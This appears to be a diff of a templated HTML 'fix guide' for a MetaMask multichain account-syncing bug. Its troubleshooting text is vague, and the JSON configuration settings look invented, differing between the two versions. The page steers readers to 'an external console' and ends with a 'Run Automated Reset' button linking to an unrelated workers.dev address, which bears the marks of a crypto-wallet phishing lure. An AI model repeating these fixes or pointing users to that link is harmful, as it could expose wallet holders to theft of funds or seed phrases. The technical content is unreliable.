@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
+        font-family: -apple-system;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #00adb5;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,34 @@
 <h1>Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience excessive account creation and syncing issues with Metamask extension, resulting in performance degradation and potential crashes.</li>
+<li>Users are experiencing issues with the Metamask extension, specifically with the creation and syncing of multichain accounts, resulting in a span fan-out error.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to uncontrolled multichain account creation and syncing, causing a fan-out effect that overwhelms the system.</li>
+<li>The error occurs due to an uncontrolled growth in the number of accounts being created and synced across multiple chains, causing a fan-out effect that overwhelms the system.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Stop the Metamask extension and restart it to reset the account syncing process.</li>
-<li>Limit the number of accounts created per chain using the following configuration:</li>
+<li>To mitigate this issue, the following manual overrides can be applied:</li>
+<li>Limit the number of accounts being created and synced concurrently</li>
+<li>Implement a rate limiter to control the frequency of account creation and syncing requests</li>
+<li>Configure the Metamask extension to prioritize account syncing based on user activity</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;accountCreationLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;chainSyncLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
+<span class="w">  </span><span class="nt">&quot;accountCreationLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;syncRateLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;prioritySync&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<ul>
-<li>Use the <code>eth_accounts</code> API to manually retrieve and manage accounts, ensuring a more controlled approach to account creation and syncing.
-Consider utilizing an external console for more advanced debugging and configuration. </li>
-</ul>
+<p>Consider utilizing an external console for further debugging and configuration.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured</li>
-<li>Basic understanding of Ethereum blockchain and account management</li>
-<li>Familiarity with JSON configuration files</li>
+<li>Metamask extension version 10.2.1 or later</li>
+<li>Ethereum chain ID configured correctly</li>
+<li>User account properly set up and connected to the extension</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-manage-tokens-miss-match-with-net.html">Metamask Extension Bug Assets Manage Tokens Miss Match With Net</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
